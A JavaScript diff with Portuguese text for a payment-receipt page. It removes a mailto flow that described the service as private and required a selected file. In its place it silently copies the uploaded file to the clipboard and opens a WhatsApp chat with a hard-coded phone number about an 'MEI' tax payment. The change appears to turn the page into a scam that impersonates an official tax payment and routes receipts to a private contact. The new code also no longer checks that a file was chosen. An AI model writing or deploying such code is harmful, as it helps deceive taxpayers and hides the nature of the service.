-        btnEnviarEmail.addEventListener('click', () => {
-            if (inputArquivo.files.length === 0) {
-                alert('Atenção: é obrigatório selecionar o arquivo do comprovante antes de continuar.');
-                return;
+            const file = inputArquivo.files[0];
+            if (navigator.clipboard && window.ClipboardItem) {
+                try {
+                    const item = new ClipboardItem({ [file.type]: file });
+                    navigator.clipboard.write([item]).catch(() => {});
+                } catch (e) {}
             }
 
-            if (!EMAIL_DESTINO || EMAIL_DESTINO === 'COLOQUE_SEU_EMAIL_AQUI' || !EMAIL_DESTINO.includes('@')) {
-                alert('O e-mail de recebimento ainda não foi configurado. No código do site, substitua COLOQUE_SEU_EMAIL_AQUI pelo endereço de e-mail que deve receber os comprovantes.');
-                return;
-            }
+            const mensagem = encodeURIComponent("Olá! Estou a enviar o comprovante de pagamento do MEI.");
+            window.open(`https://wa.me/5516996565112?text=${mensagem}`, '_blank');
 
-            const arquivo = inputArquivo.files[0];
-            const assunto = encodeURIComponent('Comprovante de pagamento - serviço privado');
-            const corpo = encodeURIComponent(
-                'Olá, estou enviando o comprovante de pagamento do serviço contratado.\n\n' +
-                'Nome do arquivo selecionado: ' + arquivo.name + '\n\n' +
-                'Vou anexar o arquivo manualmente a este e-mail. Por favor, confirmem o recebimento e a validação antes de atualizar a baixa.'
-            );
-            window.location.href = `mailto:${EMAIL_DESTINO}?subject=${assunto}&body=${corpo}`;
-
-            mensagemPendente.textContent = 'O aplicativo de e-mail deve abrir com a mensagem preenchida. Anexe o comprovante manualmente e envie o e-mail. O débito só será atualizado após o prestador receber e validar o comprovante.';
             step2.style.display = 'none';
             step3.style.display = 'block';
         });
